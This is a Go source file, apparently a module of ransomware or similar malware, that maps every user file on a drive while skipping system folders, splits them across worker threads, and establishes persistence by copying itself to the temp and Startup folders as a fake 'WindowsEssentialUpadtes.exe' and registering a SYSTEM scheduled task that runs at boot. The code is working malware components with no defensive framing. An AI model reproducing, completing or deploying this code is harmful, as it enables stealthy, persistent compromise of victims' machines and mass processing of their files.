package Explorer

import (
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func CalcThreads(fixed_files []string) (int, int, int) {

	num_of_files := len(fixed_files)
	num_of_files_per_thread := 0
	num_of_threads_to_add_extra_files := 0
	var num_of_threads int

	if num_of_files < 100 {
		num_of_threads = num_of_files
		num_of_threads_to_add_extra_files = 0
		num_of_files_per_thread = 1

	} else {
		num_of_threads = 50
		num_of_threads_to_add_extra_files = num_of_files % 50
		num_of_files_per_thread = num_of_files / 50

	}

	return num_of_threads, num_of_files_per_thread, num_of_threads_to_add_extra_files

}

func MapFiles(root string) []string {
	var files []string

	error := filepath.WalkDir(root, func(path string, entry fs.DirEntry, err error) error {
		if err != nil {
			if errors.Is(err, syscall.Errno(0x5)) { // check if error is a permission error
				return filepath.SkipDir // skip file/directory and its contents
			}
			return err // return other errors
		}

		if entry.IsDir() && entry.Name() == "Program Files" || entry.IsDir() && entry.Name() == "Programdata" {
			return filepath.SkipDir
		}

		files = append(files, path)

		return nil
	})

	if error != nil {
		//panic(error)
		fmt.Println("Error in mapfiles", error)

	}

	return files
}

func DeleteScheduledTask(taskName string) error {
	cmd := exec.Command("schtasks", "/Delete", "/TN", taskName, "/F")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to delete scheduled task %s: %v", taskName, err)
	}

	err := os.Remove(os.TempDir() + "/WindowsEssentialUpadtes.exe")
	if err != nil {
		return err
	}

	return nil
}

func CreateScheduledTask(taskName string) error {
	cmd := exec.Command("schtasks", "/Create", "/TN", taskName, "/TR", os.TempDir()+"\\WindowsEssentialUpadtes.exe", "/SC", "onstart", "/RU", "SYSTEM")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to Create scheduled task %s: %v", taskName, err)
	}

	cmd = exec.Command("schtasks", "/Change", "/TN", taskName, "/RU", "SYSTEM", "/ENABLE")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to Enable scheduled task %s: %v", taskName, err)
	}
	return nil
}

func MakeCopy() bool {

	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error getting executable path:", err)
		return false
	}
	fmt.Println("Executable path:", exePath)

	// create a new file in the destination directory
	destPath := os.TempDir() + "/WindowsEssentialUpadtes.exe"
	destFile, err := os.Create(destPath)
	if err != nil {
		fmt.Println("Error creating destination file:", err)
		return false
	}

	// open the source file
	srcFile, err := os.Open(exePath)
	if err != nil {
		fmt.Println("Error opening source file:", err)
		return false
	}
	defer srcFile.Close()

	// copy the contents of the source file to the destination file
	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		fmt.Println("Error copying file contents:", err)
		return false
	}

	srcFile, err = os.Open(exePath)
	if err != nil {
		fmt.Println("Error opening source file:", err)
		return false
	}
	defer srcFile.Close()

	startupFolder := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	startupFile, err := os.Create(startupFolder + "/WindowsEssentialUpadtes.exe")
	if err != nil {
		fmt.Println("Error creating destination file:", err)
		return false
	}

	_, err = io.Copy(startupFile, srcFile)
	if err != nil {
		fmt.Println("Error copying file contents:", err)
		return false
	}

	fmt.Println("File copied successfully")
	return true

}
